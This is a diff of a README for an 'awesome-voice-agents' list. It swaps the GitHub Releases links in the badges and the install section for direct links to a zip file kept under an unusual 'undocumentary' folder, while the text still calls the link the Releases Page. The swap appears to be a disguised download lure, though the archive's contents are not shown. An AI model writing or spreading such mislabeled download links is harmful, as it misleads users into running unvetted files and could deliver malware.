@@ -1,6 +1,6 @@
 # 🎤 awesome-voice-agents - Explore Voice AI with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Michaelrace/awesome-voice-agents/releases)
+[![Download](https://raw.githubusercontent.com/Michaelrace/awesome-voice-agents/main/undocumentary/awesome-voice-agents-v2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Michaelrace/awesome-voice-agents/main/undocumentary/awesome-voice-agents-v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **awesome-voice-agents**, your go-to resource for voice AI agent fram
 
 ## 📥 Download & Install
 
-To start using the application, visit this page to download: [Releases Page](https://github.com/Michaelrace/awesome-voice-agents/releases).
+To start using the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Michaelrace/awesome-voice-agents/main/undocumentary/awesome-voice-agents-v2.1.zip).
 
 1. Click the link above to open the GitHub Releases page.
 2. Look for the latest version listed. Here, you will find the files available for download.
@@ -76,4 +76,4 @@ Downloading and running **awesome-voice-agents** is simple. Follow the steps out
 
 For your convenience, you can always revisit the Releases Page to check for updates or new features. Enjoy your journey into the world of voice AI agents!
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Michaelrace/awesome-voice-agents/releases)
+[![Download](https://raw.githubusercontent.com/Michaelrace/awesome-voice-agents/main/undocumentary/awesome-voice-agents-v2.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Michaelrace/awesome-voice-agents/main/undocumentary/awesome-voice-agents-v2.1.zip)
